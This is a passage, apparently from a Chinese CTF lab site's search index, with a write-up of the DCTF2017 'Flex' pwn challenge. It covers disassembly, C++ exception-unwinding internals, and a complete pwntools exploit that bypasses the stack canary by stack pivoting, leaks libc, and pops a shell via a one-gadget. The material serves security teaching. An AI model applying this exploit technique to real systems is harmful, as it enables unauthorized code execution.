8345f401       add dword [local_ch], 1      ; local_ch += 1\n|    | |`=\n 0x00400ef1      ebaf           jmp 0x400ea2                 ; \u5faa\u73af\uff0c\u7ee7\u7eed\u8bfb\u5165\u5b57\u7b26\n|    | |       ; JMP XREF from 0x00400ea8 (sub.read_e76)\n|    | `--\n 0x00400ef3      8b45e4         mov eax, dword [local_1ch]\n|    |      0x00400ef6      83e801         sub eax, 1\n|    |      0x00400ef9      89c2           mov edx, eax\n|    |      0x00400efb      488b45e8       mov rax, qword [local_18h]\n|    |      0x00400eff      4801d0         add rax, rdx                ; \n(\n\n|    |      0x00400f02      c60000         mov byte [rax], 0\n|    |      0x00400f05      8b45f4         mov eax, dword [local_ch]\n|    |         ; JMP XREF from 0x00400edb (sub.read_e76)\n|    `----\n 0x00400f08      488b4df8       mov rcx, qword [local_8h]    ; \u8bfb\u5b8c\u5b57\u7b26\u4e32\uff0c\u8df3\u51fa\u5faa\u73af\n|           0x00400f0c      6448330c2528.  xor rcx, qword fs:[0x28]\n|       ,=\n 0x00400f15      7405           je 0x400f1c\n|       |   0x00400f17      e8a4fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00400f15 (sub.read_e76)\n|       `-\n 0x00400f1c      c9             leave\n\\           0x00400f1d      c3             ret\n\n\n\n\u5206\u6790\u5b8c\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u5199 exp \u5427\u3002\n\n\nstack pivot\n\n\n\u5728 \n0x004012b4\n \u4e0b\u65ad\u70b9\uff0c\u4ee5\u68c0\u67e5\u6ea2\u51fa\u70b9\uff1a\n\ngdb-peda$ x/s $rbp\n0x7fffffffe3f0: \n5A%KA%gA%6A%\n\ngdb-peda$ pattern_offset 5A%KA%gA%6A%\n5A%KA%gA%6A% found at offset: 288\n\n\n\u6240\u4ee5\u7f13\u51b2\u533a\u7684\u957f\u5ea6\u4e3a \n288 / 8 = 36\n\u3002\u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u8986\u76d6\u6389 rbp\uff0c\u5728\u5f02\u5e38\u5904\u7406\u8fc7\u7a0b\u4e2d\uff0cunwind \u4f8b\u7a0b\u5411\u4e0a\u4e00\u7ea7\u4e00\u7ea7\u5730\u627e\u5f02\u5e38\u5904\u7406\u51fd\u6570\uff0c\u7136\u540e\u6062\u590d\u76f8\u5173\u6570\u636e\uff0c\u8fd9\u6837\u5c31\u5c06\u6808\u8f6c\u79fb\u5230\u4e86\u65b0\u5730\u5740\uff1a\n\n# stack pivot\n\n\npayload_1\n  \n=\n \nAAAAAAAA\n \n*\n \n36\n\n\npayload_1\n \n+=\n \np64\n(\npivote_addr\n)\n\n\npayload_1\n \n+=\n \np64\n(\nunwind_addr\n)\n\n\n\nunwind_addr \u5fc5\u987b\u662f\u8c03\u7528\u51fd\u6570\u91cc\u7684\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u6837\u629b\u51fa\u7684\u5f02\u5e38\u624d\u80fd\u88ab\u8c03\u7528\u51fd\u6570\u5185\u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570 catch\u3002\n\n\nget puts address\n\n\n\u5f02\u5e38\u5904\u7406\u51fd\u6570\u7ed3\u675f\u540e\uff0c\u6267\u884c\u4e0b\u9762\u4e24\u53e5\uff1a\n\n|      `--\n 0x0040155f      c9             leave\n\\           0x00401560      c3             ret                          ; ret \u5230 payload_2\n\n\n\u901a\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u6784\u9020 rop \u8c03\u7528 read() \u8bfb\u5165 one-gadget \u6765\u83b7\u5f97 shell\uff0c\u4f46\u53ef\u7528\u7684 gadget \u53ea\u80fd\u63a7\u5236 rdi \u548c rsi\uff0c\u800c\u4e0d\u80fd\u63a7\u5236 rdx\u3002\u6240\u4ee5\u5fc5\u987b\u901a\u8fc7\u51fd\u6570 \nsub.read_f1e\n \u6765\u505a\u5230\u8fd9\u4e00\u70b9\u3002\n\n$ ropgadget --binary flex --only \npop|ret\n\n...\n0x00000000004044d3 : pop rdi ; ret\n0x00000000004044d1 : pop rsi ; pop r15 ; ret\n\n\n\n[0x00400d80]\n pdf @ sub.read_f1e\n/ (fcn) sub.read_f1e 39\n|   sub.read_f1e ();\n|           ; var int local_10h @ rbp-0x10\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x004012e3 (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|           0x00400f1e      55             push rbp\n|           0x00400f1f      4889e5         mov rbp, rsp\n|           0x00400f22      4883ec10       sub rsp, 0x10\n|           0x00400f26      48897df8       mov qword [local_8h], rdi\n|           0x00400f2a      488975f0       mov qword [local_10h], rsi\n|           0x00400f2e      488b55f0       mov rdx, qword [local_10h]   ; rdx = \u4f20\u5165\u7684 rsi\n|           0x00400f32      488b45f8       mov rax, qword [local_8h]\n|           0x00400f36      4889c6         mov rsi, rax                 ; rsi = \u4f20\u5165\u7684 rdi\n|           0x00400f39      bf00000000     mov edi, 0                   ; fildes = 0\n|           0x00400f3e      e8adfcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x00400f43      c9             leave\n\\           0x00400f44      c3             ret\n\n\n\u6784\u9020 paylode_2 \u6253\u5370\u51fa puts \u7684\u5730\u5740\uff0c\u5e76\u8c03\u7528 \nread_f1e\n \u8bfb\u5165 payload_3 \u5230 \npivote_addr + 0x50\n \u7684\u4f4d\u7f6e\uff1a\n\n# get puts address\n\n\npayload_2\n  \n=\n \nAAAAAAAA\n\n\npayload_2\n \n+=\n \np64\n(\npop_rdi\n)\n\n\npayload_2\n \n+=\n \np64\n(\nputs_got\n)\n\n\npayload_2\n \n+=\n \np64\n(\nputs_plt\n)\n\n\npayload_2\n \n+=\n \np64\n(\npop_rdi\n)\n\n\npayload_2\n \n+=\n \np64\n(\npivote_addr\n \n+\n \n0x50\n)\n\n\npayload_2\n \n+=\n \np64\n(\npop_rsi_r15\n)\n\n\npayload_2\n \n+=\n \np64\n(\n8\n)\n\n\npayload_2\n \n+=\n \nAAAAAAAA\n\n\npayload_2\n \n+=\n \np64\n(\nread_f1e\n)\n\n\n\nio\n.\nsendline\n(\npayload_2\n)\n\n\nio\n.\nrecvuntil\n(\npattern:\n\\n\n)\n\n\nputs_addr\n \n=\n \nio\n.\nrecvuntil\n(\n\\n\n)[:\n-\n1\n]\n.\nljust\n(\n8\n,\n\\x00\n)\n\n\nputs_addr\n \n=\n \nu64\n(\nputs_addr\n)\n\n\n\n\nget shell\n\n\n\u627e\u5230 libc \u7684 \ndo_system\n \u51fd\u6570\u91cc\u7684 one-gadget \u5730\u5740\u4e3a \n0x00041ee7\n\uff1a\n\n|           0x00041ee7      488b056aff36.  mov rax, qword [0x003b1e58] ; [0x3b1e58:8]=0\n|           0x00041eee      488d3d409313.  lea rdi, str._bin_sh        ; 0x17b235 ; \n/bin/sh\n\n|           0x00041ef5      c70521253700.  mov dword [obj.lock_4], 0   ; [0x3b4420:4]=0\n|           0x00041eff      c7051b253700.  mov dword [obj.sa_refcntr], 0 ; [0x3b4424:4]=0\n|           0x00041f09      488d742430     lea rsi, [local_30h]        ; sym.lm_cache ; 0x30\n|           0x00041f0e      488b10         mov rdx, qword [rax]\n|           0x00041f11      67e8c9260800   call sym.execve\n\n\n\u901a\u8fc7\u6cc4\u9732\u51fa\u7684 puts \u5730\u5740\uff0c\u8ba1\u7b97\u7b26\u53f7\u504f\u79fb\u5f97\u5230 one-gadget \u5730\u5740\uff0c\u6784\u9020 payload_3\uff1a\n\nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\nsymbols\n[\nputs\n]\n\n\none_gadget\n \n=\n \nlibc_base\n \n+\n \n0x00041ee7\n\n\n\n# get shell\n\n\npayload_3\n \n=\n \np64\n(\none_gadget\n)\n\n\n\n\nBingo!!!\n\n$ python2 exp.py\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] \n/usr/lib/libc-2.26.so\n\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n[*] Switching to interactive mode\n$ whoami\nfirmy\n\n\n\nExploit\n\n\n\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nio\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n\nlibc\n \n=\n \nELF\n(\n/usr/lib/libc-2.26.so\n)\n\n\n\nio\n.\nrecvuntil\n(\noption:\n\\n\n)\n\n\nio\n.\nsendline\n(\n1\n)\n\n\nio\n.\nrecvuntil\n(\n(yes/No)\n)\n\n\nio\n.\nsendline\n(\nNo\n)\n\n\nio\n.\nrecvuntil\n(\n(yes/No)\n)\n\n\nio\n.\nsendline\n(\nyes\n)\n\n\nio\n.\nrecvuntil\n(\nlength:\n)\n\n\nio\n.\nsendline\n(\n-3\n)\n\n\nio\n.\nrecvuntil\n(\ncharset:\n)\n\n\n\nputs_plt\n \n=\n \n0x00400bD0\n\n\nputs_got\n \n=\n \n0x00606020\n\n\nread_f1e\n \n=\n \n0x00400f1e\n\n\npop_rdi\n \n=\n \n0x004044d3\n        \n# pop rdi ; ret\n\n\npop_rsi_r15\n \n=\n \n0x004044d1\n    \n# pop rsi ; pop r15 ; ret\n\n\n\npivote_addr\n \n=\n \n0x6061C0\n\n\nunwind_addr\n \n=\n \n0x00401509\n    \n# make sure unwind can find the catch routine\n\n\n\n# stack pivot\n\n\npayload_1\n  \n=\n \nAAAAAAAA\n \n*\n \n36\n\n\npayload_1\n \n+=\n \np64\n(\npivote_addr\n)\n\n\npayload_1\n \n+=\n \np64\n(\nunwind_addr\n)\n\n\n\nio\n.\nsendline\n(\npayload_1\n)\n\n\nio\n.\nrecvuntil\n(\n\\n\n)\n\n\n\n# get puts address\n\n\npayload_2\n  \n=\n \nAAAAAAAA\n       \n# fake ebp\n\n\npayload_2\n \n+=\n \np64\n(\npop_rdi\n)\n\n\npayload_2\n \n+=\n \np64\n(\nputs_got\n)\n\n\npayload_2\n \n+=\n \np64\n(\nputs_plt\n)\n\n\npayload_2\n \n+=\n \np64\n(\npop_rdi\n)\n\n\npayload_2\n \n+=\n \np64\n(\npivote_addr\n \n+\n \n0x50\n)\n\n\npayload_2\n \n+=\n \np64\n(\npop_rsi_r15\n)\n\n\npayload_2\n \n+=\n \np64\n(\n8\n)\n\n\npayload_2\n \n+=\n \nAAAAAAAA\n\n\npayload_2\n \n+=\n \np64\n(\nread_f1e\n)\n\n\n\nio\n.\nsendline\n(\npayload_2\n)\n\n\nio\n.\nrecvuntil\n(\npattern:\n\\n\n)\n\n\nputs_addr\n \n=\n \nio\n.\nrecvuntil\n(\n\\n\n)[:\n-\n1\n]\n.\nljust\n(\n8\n,\n\\x00\n)\n\n\nputs_addr\n \n=\n \nu64\n(\nputs_addr\n)\n\n\n\nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\nsymbols\n[\nputs\n]\n\n\none_gadget\n \n=\n \nlibc_base\n \n+\n \n0x00041ee7\n\n\n\n# get shell\n\n\npayload_3\n \n=\n \np64\n(\none_gadget\n)\n\n\n\nio\n.\nsendline\n(\npayload_3\n)\n\n\nio\n.\ninteractive\n()\n\n\n\n\n\u6700\u540e\u5efa\u8bae\u8bfb\u8005\u81ea\u5df1\u591a\u8c03\u8bd5\u51e0\u904d\uff0c\u4ee5\u52a0\u6df1\u5bf9\u5f02\u5e38\u5904\u7406\u673a\u5236\u7684\u7406\u89e3\u3002\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nShanghai-DCTF-2017 \u7ebf\u4e0b\u653b\u9632Pwn\u9898\n\n\nc++ \u5f02\u5e38\u5904\u7406\uff081\uff09\n\n\nC++\u5f02\u5e38\u673a\u5236\u7684\u5b9e\u73b0\u65b9\u5f0f\u548c\u5f00\u9500\u5206\u6790", 
            "title": "DCTF2017 Flex"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/#_1", 
            "text": "$ file flex\nflex: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=30a1acbc98ccf9e8f4b3d1fc06b6ba6f0cbe7c9e, stripped\n$ checksec -f flex\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes      0               4       flex \n\u53ef\u4ee5\u770b\u5230\u5f00\u542f\u4e86 Canary\uff0c\u672c\u9898\u7684\u5173\u952e\u5c31\u662f\u5229\u7528\u67d0\u79cd\u795e\u79d8\u673a\u5236\uff08C++\u5f02\u5e38\u5904\u7406\u673a\u5236\uff09\u7ed5\u8fc7\u5b83\u3002  \u968f\u4fbf\u73a9\u4e00\u4e0b\uff0c\u4e86\u89e3\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\uff1a $ ./flex\n1.start flexmd5\n2.start flexsha256\n3.start flexsha1\n4.test security\n0 quit\noption:\n1\nFlexMD5 bruteforce tool V0.1\ncustom md5 state (yes/No)\nNo\ncustom charset (yes/No)\nyes\ncharset length:\n10\ncharset:\na\nbruteforce message pattern:\naaaa \n\u628a\u7a0b\u5e8f\u8dd1\u8d77\u6765\uff1a $ socat tcp4-listen:10001,reuseaddr,fork exec:./flex", 
            "title": "\u9898\u76ee\u590d\u73b0"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/#c", 
            "text": "$ ldd flex\n        linux-vdso.so.1 (0x00007ffcd837a000)\n        libstdc++.so.6 =  /usr/lib/libstdc++.so.6 (0x00007f748fe72000)\n        libgcc_s.so.1 =  /usr/lib/libgcc_s.so.1 (0x00007f748fc5b000)\n        libc.so.6 =  /usr/lib/libc.so.6 (0x00007f748f8a3000)\n        libm.so.6 =  /usr/lib/libm.so.6 (0x00007f748f557000)\n        /lib64/ld-linux-x86-64.so.2 =  /usr/lib64/ld-linux-x86-64.so.2 (0x00007f74901f9000) \n\u6240\u4ee5\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u4e00\u4e2a C \u548c C++ \u6df7\u5408\u7f16\u8bd1\u7684\uff0c\u4ee5\u4fbf\u5904\u7406\u5f02\u5e38\u3002  \u5f53\u7528\u6237 throw \u4e00\u4e2a\u5f02\u5e38\u65f6\uff0c\u7f16\u8bd1\u5668\u4f1a\u5e2e\u6211\u4eec\u8c03\u7528\u76f8\u5e94\u7684\u51fd\u6570\u5206\u914d  _cxa_exception  \u5c31\u662f\u5934\u90e8\uff0c exception_obj \u3002\u5f02\u5e38\u5bf9\u8c61\u7531\u51fd\u6570  __cxa_allocate_exception()  \u8fdb\u884c\u521b\u5efa\uff0c\u6700\u540e\u7531  __cxa_free_exception()  \u8fdb\u884c\u9500\u6bc1\u3002\u5f53\u6211\u4eec\u5728\u7a0b\u5e8f\u91cc\u6267\u884c\u4e86\u629b\u51fa\u5f02\u5e38\u540e\uff0c\u7f16\u8bd1\u5668\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5\uff1a\n1. \u8c03\u7528  __cxa_allocate_exception  \u51fd\u6570\uff0c\u5206\u914d\u4e00\u4e2a\u5f02\u5e38\u5bf9\u8c61\n2. \u8c03\u7528  __cxa_throw  \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5c06\u5f02\u5e38\u5bf9\u8c61\u505a\u4e00\u4e9b\u521d\u59cb\u5316\n3.  __cxa_throw()  \u8c03\u7528 Itanium ABI \u91cc\u7684  _Unwind_RaiseException()  \u4ece\u800c\u5f00\u59cb unwind\uff0cunwind \u5206\u4e3a\u4e24\u4e2a\u9636\u6bb5\uff0c\u5206\u522b\u8fdb\u884c\u641c\u7d22 catch \u53ca\u6e05\u7406\u8c03\u7528\u6808\n4.  _Unwind_RaiseException()  \u5bf9\u8c03\u7528\u94fe\u4e0a\u7684\u51fd\u6570\u8fdb\u884c unwind \u65f6\uff0c\u8c03\u7528 personality routine\uff08 __gxx_personality_v0 \uff09\n5. \u5982\u679c\u8be5\u5f02\u5e38\u5982\u80fd\u88ab\u5904\u7406\uff08\u6709\u76f8\u5e94\u7684 catch\uff09\uff0c\u5219 personality routine \u4f1a\u4f9d\u6b21\u5bf9\u8c03\u7528\u94fe\u4e0a\u7684\u51fd\u6570\u8fdb\u884c\u6e05\u7406\u3002\n6.  _Unwind_RaiseException()  \u5c06\u63a7\u5236\u6743\u8f6c\u5230\u76f8\u5e94\u7684 catch \u4ee3\u7801\n7. unwind \u5b8c\u6210\uff0c\u7528\u6237\u4ee3\u7801\u7ee7\u7eed\u6267\u884c  \u5177\u4f53\u5185\u5bb9\u67e5\u770b\u53c2\u8003\u8d44\u6599\u3002", 
            "title": "C++ \u5f02\u5e38\u5904\u7406\u673a\u5236"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/#_2", 
            "text": "\u7a0b\u5e8f\u7684\u7b2c\u56db\u4e2a\u9009\u9879\u5f88\u5438\u5f15\u4eba\uff0c\u4f46\u4f3c\u4e4e\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u7a81\u7834\u70b9\uff0c\u800c\u7b2c\u4e00\u4e2a\u9009\u9879\u53ef\u4ee5\u8f93\u5165\u7684\u4e1c\u897f\u8f83\u591a\uff0c\u95ee\u9898\u5e94\u8be5\u5728\u8fd9\u91cc\uff0c\u67e5\u770b\u8be5\u51fd\u6570  sub.bruteforcing_start:_500 \uff1a [0x00400d80]  pdf @ sub.bruteforcing_start:_500\n/ (fcn) sub.bruteforcing_start:_500 63\n|   sub.bruteforcing_start:_500 ();\n|              ; CALL XREF from 0x00402200 (main)\n|           0x00401500      55             push rbp\n|           0x00401501      4889e5         mov rbp, rsp\n|           0x00401504      4883ec10       sub rsp, 0x10\n|           0x00401508      e83bfcffff     call sub.FlexMD5_bruteforce_tool_V0.1_148\n|           0x0040150d      e87dfaffff     call fcn.00400f8f\n|           0x00401512      bf4f464000     mov edi, str.bruteforcing_start: ; 0x40464f ;  bruteforcing start: \n|           0x00401517      e8b4f6ffff     call sym.imp.puts           ; int puts(const char *s)\n|              ; JMP XREF from 0x00401534 (sub.bruteforcing_start:_500)\n|       .-  0x0040151c      e88cfeffff     call sub.strlen_3ad         ; size_t strlen(const char *s)\n|       :   0x00401521      85c0           test eax, eax\n|       :   0x00401523      0f94c0         sete al\n|       :   0x00401526      84c0           test al, al\n|      ,==  0x00401528      740c           je 0x401536\n|      |:   0x0040152a      bf01000000     mov edi, 1\n|      |:   0x0040152f      e83cf7ffff     call sym.imp.sleep          ; int sleep(int s)\n|      |`=  0x00401534      ebe6           jmp 0x40151c\n|      |       ; JMP XREF from 0x00401528 (sub.bruteforcing_start:_500)\n|      |       ; JMP XREF from 0x0040155d (sub.bruteforcing_start:_500 + 93)\n|      `.-  0x00401536      b800000000     mov eax, 0                   ; \u5f02\u5e38\u5904\u7406\u4ee3\u7801\n|      ,==  0x0040153b      eb22           jmp 0x40155f\n       |:   0x0040153d      4883fa01       cmp rdx, 1                  ; 1 ; \u5982\u679c\u6210\u529f\u6355\u83b7\u5f02\u5e38\uff0c\u5219\u8df3\u8f6c\u5230\u8fd9\u91cc\n      ,===  0x00401541      7408           je 0x40154b                  ; \u8df3\u8f6c\n      ||:   0x00401543      4889c7         mov rdi, rax\n      ||:   0x00401546      e8f5f7ffff     call sym.imp._Unwind_Resume\n      ||:      ; JMP XREF from 0x00401541 (sub.bruteforcing_start:_500 + 65)\n      `---  0x0040154b      4889c7         mov rdi, rax\n       |:   0x0040154e      e8bdf7ffff     call sym.imp.__cxa_begin_catch\n       |:   0x00401553      8b00           mov eax, dword [rax]\n       |:   0x00401555      8945fc         mov dword [rbp - 4], eax\n       |:   0x00401558      e8a3f7ffff     call sym.imp.__cxa_end_catch\n       |`=  0x0040155d      ebd7           jmp 0x401536                ; sub.bruteforcing_start:_500+0x36\n|      |       ; JMP XREF from 0x0040153b (sub.bruteforcing_start:_500)\n|      `--  0x0040155f      c9             leave\n\\           0x00401560      c3             ret                          ; ret \u5230 payload_2 \n\u51fd\u6570  sub.FlexMD5_bruteforce_tool_V0.1_148 \uff1a [0x00400d80]  pdf @ sub.FlexMD5_bruteforce_tool_V0.1_148\n/ (fcn) sub.FlexMD5_bruteforce_tool_V0.1_148 613\n|   sub.FlexMD5_bruteforce_tool_V0.1_148 ();\n|           ; var int local_124h @ rbp-0x124\n|           ; var int local_120h @ rbp-0x120\n|           ; var int local_18h @ rbp-0x18\n|              ; CALL XREF from 0x00401508 (sub.bruteforcing_start:_500)\n|           0x00401148      55             push rbp\n|           0x00401149      4889e5         mov rbp, rsp\n|           0x0040114c      53             push rbx\n|           0x0040114d      4881ec280100.  sub rsp, 0x128\n|           0x00401154      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ;  (  ; 40\n|           0x0040115d      488945e8       mov qword [local_18h], rax\n|           0x00401161      31c0           xor eax, eax\n|           0x00401163      bf47454000     mov edi, str.FlexMD5_bruteforce_tool_V0.1 ; 0x404547 ;  FlexMD5 bruteforce tool V0.1 \n|           0x00401168      e863faffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x0040116d      bf64454000     mov edi, str.custom_md5_state__yes_No_ ; 0x404564 ;  custom md5 state (yes/No)                                                             \n|           0x00401172      e859faffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x00401177      488d85e0feff.  lea rax, [local_120h]\n|           0x0040117e      be04000000     mov esi, 4\n|           0x00401183      4889c7         mov rdi, rax\n|           0x00401186      e8ebfcffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x0040118b      488d85e0feff.  lea rax, [local_120h]\n|           0x00401192      ba03000000     mov edx, 3\n|           0x00401197      be7e454000     mov esi, 0x40457e           ;  yes \n|           0x0040119c      4889c7         mov rdi, rax\n|           0x0040119f      e85cfaffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)\n|           0x004011a4      85c0           test eax, eax\n|       ,=  0x004011a6      755e           jne 0x401206\n|       |   0x004011a8      c705f24f2000.  mov dword [0x006061a4], 1   ; [0x6061a4:4]=0\n|       |   0x004011b2      bf82454000     mov edi, str.initial_state_0_: ; 0x404582 ;  initial state[0]: \n|       |   0x004011b7      e814faffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004011bc      e884fdffff     call sub.atoi_f45           ; int atoi(const char *str)\n|       |   0x004011c1      8905e94f2000   mov dword [0x006061b0], eax ; [0x6061b0:4]=0\n|       |   0x004011c7      bf94454000     mov edi, str.initial_state_1_: ; 0x404594 ;  initial state[1]: \n|       |   0x004011cc      e8fff9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004011d1      e86ffdffff     call sub.atoi_f45           ; int atoi(const char *str)\n|       |   0x004011d6      8905d84f2000   mov dword [0x006061b4], eax ; [0x6061b4:4]=0\n|       |   0x004011dc      bfa6454000     mov edi, str.initial_state_2_: ; 0x4045a6 ;  initial state[2]: \n|       |   0x004011e1      e8eaf9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004011e6      e85afdffff     call sub.atoi_f45           ; int atoi(const char *str)\n|       |   0x004011eb      8905c74f2000   mov dword [0x006061b8], eax ; [0x6061b8:4]=0\n|       |   0x004011f1      bfb8454000     mov edi, str.initial_state_3_: ; 0x4045b8 ;  initial state[3]: \n|       |   0x004011f6      e8d5f9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004011fb      e845fdffff     call sub.atoi_f45           ; int atoi(const char *str)\n|       |   0x00401200      8905b64f2000   mov dword [0x006061bc], eax ; [0x6061bc:4]=0\n|       |      ; JMP XREF from 0x004011a6 (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       `-  0x00401206      bfca454000     mov edi, str.custom_charset__yes_No_ ; 0x4045ca ;  custom charset (yes/No) \n|           0x0040120b      e8c0f9ffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x00401210      488d85e0feff.  lea rax, [local_120h]\n|           0x00401217      be04000000     mov esi, 4\n|           0x0040121c      4889c7         mov rdi, rax\n|           0x0040121f      e852fcffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x00401224      488d85e0feff.  lea rax, [local_120h]\n|           0x0040122b      ba03000000     mov edx, 3\n|           0x00401230      be7e454000     mov esi, 0x40457e           ;  yes \n|           0x00401235      4889c7         mov rdi, rax\n|           0x00401238      e8c3f9ffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)\n|           0x0040123d      85c0           test eax, eax\n|       ,=  0x0040123f      0f858a000000   jne 0x4012cf\n|       |   0x00401245      c705554f2000.  mov dword [0x006061a4], 1   ; [0x6061a4:4]=0\n|       |   0x0040124f      bfe2454000     mov edi, str.charset_length: ; 0x4045e2 ;  charset length: \n|       |   0x00401254      e877f9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x00401259      e8e7fcffff     call sub.atoi_f45           ; int atoi(const char *str) ; \u8bfb\u5165\u5b57\u7b26\u4e32\u5e76\u8f6c\u6362\u6210\u6574\u578b\u6570\n|       |   0x0040125e      8905ac4e2000   mov dword [0x00606110], eax ; [0x606110:4]=62\n|       |   0x00401264      8b05a64e2000   mov eax, dword [0x00606110] ; [0x606110:4]=62\n|       |   0x0040126a      3d00010000     cmp eax, 0x100              ; 256 ; \u6bd4\u8f83\u5927\u5c0f\n|      ,==  0x0040126f      7e22           jle 0x401293                 ; eax   256 \u65f6\u8df3\u8f6c ; \u8fd9\u91cc\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u8d1f\u6570\u5373\u53ef\u6210\u529f\u8df3\u8f6c\n|      ||   0x00401271      bf04000000     mov edi, 4\n|      ||   0x00401276      e855faffff     call sym.imp.__cxa_allocate_exception\n|      ||   0x0040127b      c70002000000   mov dword [rax], 2\n|      ||   0x00401281      ba00000000     mov edx, 0\n|      ||   0x00401286      be70616000     mov esi, obj.typeinfoforint ; 0x606170\n|      ||   0x0040128b      4889c7         mov rdi, rax\n|      ||   0x0040128e      e85dfaffff     call sym.imp.__cxa_throw\n|      ||      ; JMP XREF from 0x0040126f (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|      `--  0x00401293      bff2454000     mov edi, str.charset:       ; 0x4045f2 ;  charset: \n|       |   0x00401298      e833f9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x0040129d      8b056d4e2000   mov eax, dword [0x00606110] ; [0x606110:4]=62 ; \u53d6\u51fa\u6570\u5b57\n|       |   0x004012a3      83c001         add eax, 1                   ; eax += 1\n|       |   0x004012a6      89c2           mov edx, eax\n|       |   0x004012a8      488d85e0feff.  lea rax, [local_120h]\n|       |   0x004012af      89d6           mov esi, edx\n|       |   0x004012b1      4889c7         mov rdi, rax\n|       |   0x004012b4      e8bdfbffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte) ; \u8be5\u51fd\u6570\u5185\u8c03\u7528 read(0, [local_120h], esi) \u8bfb\u5165\u6211\u4eec\u7684 payload_1\uff0c\u7531\u4e8eesi\u662f\u4e00\u4e2a\u8d1f\u6570\uff0c\u800c 0x00400ea8 jae 0x400ef3 \u5904\u662f\u4e0e\u4e00\u4e2a\u975e\u8d1f\u6570\u6bd4\u8f83\uff0c\u6c38\u8fdc\u4e0d\u4f1a\u76f8\u7b49\uff0c\u5373\u53ef\u4ee5\u8bfb\u5165\u4ee5\u6362\u884c\u7b26\u7ed3\u5c3e\u7684\u4efb\u610f\u6570\u91cf\u5b57\u7b26\n|       |   0x004012b9      488d85e0feff.  lea rax, [local_120h]\n|       |   0x004012c0      4889c7         mov rdi, rax\n|       |   0x004012c3      e8e8f9ffff     call sym.imp.strdup         ; char *strdup(const char *src) ; \u5728\u5806\u4e2d\u590d\u5236\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u526f\u672c\n|       |   0x004012c8      488905494e20.  mov qword str.ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789, rax ; [0x606118:8]=0x404508 str.ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\n|       |      ; JMP XREF from 0x0040123f (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       `-  0x004012cf      bffb454000     mov edi, str.bruteforce_message_pattern: ; 0x4045fb ;  bruteforce message pattern: \n|           0x004012d4      e8f7f8ffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x004012d9      be00040000     mov esi, 0x400              ; 1024\n|           0x004012de      bfc0616000     mov edi, 0x6061c0\n|           0x004012e3      e836fcffff     call sub.read_f1e           ; ssize_t read(int fildes, void *buf, size_t nbyte) ; \u8c03\u7528 read(0, 0x6061c0, 0x400) \u8bfb\u5165 payload_2\n|           0x004012e8      bfc0616000     mov edi, 0x6061c0\n|           0x004012ed      e85ef9ffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|           0x004012f2      8905a84e2000   mov dword [0x006061a0], eax ; [0x6061a0:4]=0\n|           0x004012f8      c785dcfeffff.  mov dword [local_124h], 0\n|              ; JMP XREF from 0x00401334 (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       .-  0x00401302      8b85dcfeffff   mov eax, dword [local_124h]\n|       :   0x00401308      4863d8         movsxd rbx, eax              ; \u5c06 rbx \u521d\u59cb\u5316\u4e3a 0\n|       :   0x0040130b      bfc0616000     mov edi, 0x6061c0            ; paylaod_2 \u7684\u5730\u5740\n|       :   0x00401310      e83bf9ffff     call sym.imp.strlen         ; 